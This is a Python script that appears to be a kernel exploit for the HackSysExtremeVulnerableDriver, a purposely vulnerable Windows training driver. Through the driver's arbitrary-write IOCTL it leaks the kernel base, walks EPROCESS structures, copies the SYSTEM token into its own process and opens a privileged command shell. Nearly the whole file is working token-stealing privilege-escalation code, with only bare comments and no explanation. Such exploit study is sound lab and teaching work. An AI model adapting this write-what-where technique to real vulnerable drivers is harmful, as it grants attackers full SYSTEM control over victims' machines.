#!/usr/bin/python
# -*- coding: utf-8 -*-

import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *

############################################ Windows Constants ##############################################

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

################################################### ADDRESSES FOR MSDN ######################################################

USER_ADDR = 0x000000001a000000
USER_ADDR_OFFSET = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
USER_ADDR_OFFSET2 = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
USER_MEM_PAGE_PTR = USER_ADDR + 0x000 # Requires 16 byte offset in our defined user memory.
CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
BASEADDRESS = c_ulonglong(USER_ADDR)
ALLOCATED_USER_MEM_SZ = c_ulonglong(0x8000)

###################################################### CHOSEN IOCTL CODE ##########################################################

IOCTL_code = 0x0022200B

###################################################### DEFINITIONS ##########################################################

ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]

kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]

kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]

ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]

STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

dwStatus = ntdll.NtAllocateVirtualMemory(
    CURRENT_PROCESS_HANDLE,
    byref(BASEADDRESS),
    0,
    byref(ALLOCATED_USER_MEM_SZ),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


########################################## KERNEL BASE ################################################

def getkernelBase(driver):
    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info), addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:
        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))

    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:0x8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
    sys_info = create_string_buffer(sys_info.raw[0x8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)
            
            return (img_name, long(kernel_base, 0))
    counter += sizeof(tmp)


########################################### CALCULATE OFFSETS FROM KERNEL #############################################

def get_PsISP_kernel_address(driver, kernel_base, img_name):

    kernel32.LoadLibraryA.restype = c_uint64
    kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    kernel32.GetProcAddress.restype = c_uint64

    # Load kernel image in userland and get PsInitialSystemProcess offset
    kernel_handle = kernel32.LoadLibraryA(img_name)
    print '[+] Loading %s in Userland' % img_name

    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))
    PsISP_User_Address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_User_Address

    # Calculate PsInitialSystemProcess offset in kernel land
    ptr_to_system_EPROCESS_struct_ptr = kernel_base + (PsISP_User_Address - kernel_handle)
    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_EPROCESS_struct_ptr

    PsISP_kernel_address = c_ulonglong()

    system_EPROCESS_struct_ptr = readValueatAddress(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
    
    print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]

    system_EPROCESS_struct_ptr = cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]

    return long(system_EPROCESS_struct_ptr)

################################################### USER WRITE FUNCTION ###########################################################

def writeWhatWhere(driver, system_token_value, where):
    
    # Write the what value to WRITE_TARGET_ADDR
    data = struct.pack("<Q", system_token_value)
    #print "Write what: " + hex(system_token_value)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR_OFFSET, data, len(data), byref(written))
    
    #print "What buffer contains: %08x" % cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]

    if dwStatus == 0:
        print("Something went wrong while writing to memory","e")
        sys.exit()

    # Pack the address of the what value and the USER_MEM_PAGE_PTR address
    data = struct.pack("<Q", USER_ADDR_OFFSET) + struct.pack("<Q", where)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))

    if dwStatus == 0:
        print("Something went wrong while writing to memory in the packing section","e")
        sys.exit()
    
    IoControlCode = IOCTL_code
    InputBuffer = c_void_p(USER_ADDR)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0x0)
    OutputBufferLength = 0x0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
    #print "Our memory target is: " + str(hex(where))
    return triggerIOCTL

################################################### KERNEL WRITE FUNCTION ###########################################################

def readValueatAddress(driver, target_address_of_value, target_address_to_write_over):
    
    data = struct.pack("<Q", target_address_of_value) + struct.pack("<Q", target_address_to_write_over)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
    if dwStatus == 0:
        print("Something went wrong while writing to memory in the packing section","e")
        sys.exit()
    
    IoControlCode = IOCTL_code
    InputBuffer = c_void_p(USER_ADDR)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0x0)
    OutputBufferLength = 0x0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)

    return triggerIOCTL

############################## GET CURRENT PROCESS TOKEN OFFSET ################################

def get_current_eprocess(eprocess_pointer, driver):
    """ Returns ptr to Current EPROCESS structure """
    PID_OFFSET = 0x2e0
    ACTIVE_PROC_LINK_OFFSET = 0x2e8
    TOKEN_OFFSET = 0x358

    readValueatAddress(driver, eprocess_pointer + ACTIVE_PROC_LINK_OFFSET, USER_ADDR)

    currentEPROCESS = cast(USER_ADDR, POINTER(c_ulonglong))[0]

    return long(currentEPROCESS)

####################################### GET DRIVER HANDLE ######################################

def getDriver():

    driver = kernel32.CreateFileA(
        '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,
        0,
        None,
        )
    if not driver or driver == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

        return driver
        
########################################### MAIN ###############################################

def executeOverwrite():

        print "MAIN Getting Driver!"
        driver = getDriver()
        
        # Get kernel base.
        print "MAIN Got Driver, getting Kernel Base!"
        (img_name, kernel_base) = getkernelBase(driver)

        # Get system process base.
        print "MAIN Got Kernel Base, Getting System Process Base!"
        system_EPROCESS_struct_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)

        # Define our expected offsets for this version of Windows.
        ACTIVE_PROC_LINK_OFFSET = 0x2e8
        TOKEN_OFFSET = 0x358

        # Calculate SYSTEM token
        location_of_system_token = system_EPROCESS_struct_ptr + TOKEN_OFFSET 

        readValueatAddress(driver, location_of_system_token, USER_MEM_PAGE_PTR)
        system_token_value = cast(USER_ADDR, POINTER(c_ulonglong))[0]
        print "Location of SYSTEM_TOKEN is: " + hex(location_of_system_token)
        print "SYSTEM_TOKEN is: " + hex(system_token_value)

        total_writes = 0

        print "Finding link from system offset: "
        ptr_firstEPROCESS = readValueatAddress(driver, system_EPROCESS_struct_ptr+0x2e8, USER_ADDR_OFFSET)
        deref_ptr_firstEPROCESS = readValueatAddress(driver, ptr_firstEPROCESS, USER_ADDR_OFFSET)
        ptr_backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
        flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
        
        while True:
            PID_OFFSET = 0x2e0

            flinkEPROCESS = flink - ACTIVE_PROC_LINK_OFFSET

            nextEPROCESSflink = flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET
            deref_ptr_nextEPROCESS = readValueatAddress(driver, nextEPROCESSflink, USER_ADDR_OFFSET)
            
            nextflink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]

            currentPIDptr = c_ulonglong(0)

            myPID = os.getpid()
            print "Searching for process ID: " + str(myPID)
            currentPIDptr = flinkEPROCESS + PID_OFFSET
            currentPIDuser = readValueatAddress(driver, currentPIDptr, USER_ADDR_OFFSET)
            currentPID = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]

            print "Read current PID as: " + str(currentPID)

            
            where = flinkEPROCESS + TOKEN_OFFSET
            if myPID == currentPID:
                print "Found our PID; Writing: " + hex(system_token_value) + " at address: " + hex(where)
                writeWhatWhere(driver, system_token_value, where)
                os.system('cmd /k "echo "whoami?" & whoami"')
                break
            
            flink = nextflink

############################################ RUN ################################################

executeOverwrite()
